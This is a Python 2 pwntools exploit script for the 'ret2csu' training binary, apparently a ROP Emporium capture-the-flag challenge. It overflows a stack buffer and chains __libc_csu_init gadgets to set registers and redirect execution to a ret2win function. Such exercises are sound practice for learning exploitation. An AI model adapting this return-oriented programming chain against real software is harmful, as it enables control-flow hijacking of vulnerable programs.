#!/usr/bin/env python2

import pwn

t = pwn.process("./ret2csu")
pwn.gdb.attach(t)


ret2win = 0x4007b1
initAddr= 0x600e38
popRdi =  0x4008a3      #pop rdi; ret;
UropGadget1 = 0x40089a #pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
UropGadget2 = 0x400880 #mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword PTR [r12+rbx*8];
                       #add rbx, 1; cmp rbp, rbx; jne 0x400880; add rsp, 8; Gadget1;


buf = 'h'*40 

#UropGadget1
buf += pwn.p64(UropGadget1)
buf += pwn.p64(7) #rbx
buf += pwn.p64(8) #rbp
buf += pwn.p64(0x600e00) #r12
buf += 'junk0000' #r13
buf += 'junk0001' #r14
buf += pwn.p64(0xdeadcafebabebeef) # r15


#using UropGadget2, sets rdx to correct value and eventually returns to ret2win
buf += pwn.p64(UropGadget2)

buf += 'junk0002' #add rsp, 8
buf += 'junk0003' #pop rbx
buf += 'junk0004' #pop rbp
buf += 'junk0005' #pop r12
buf += 'junk0006' #pop r13
buf += 'junk0007' #pop r14
buf += 'junk0008' #pop r15

buf += pwn.p64(ret2win)

t.sendline(buf)
t.interactive()
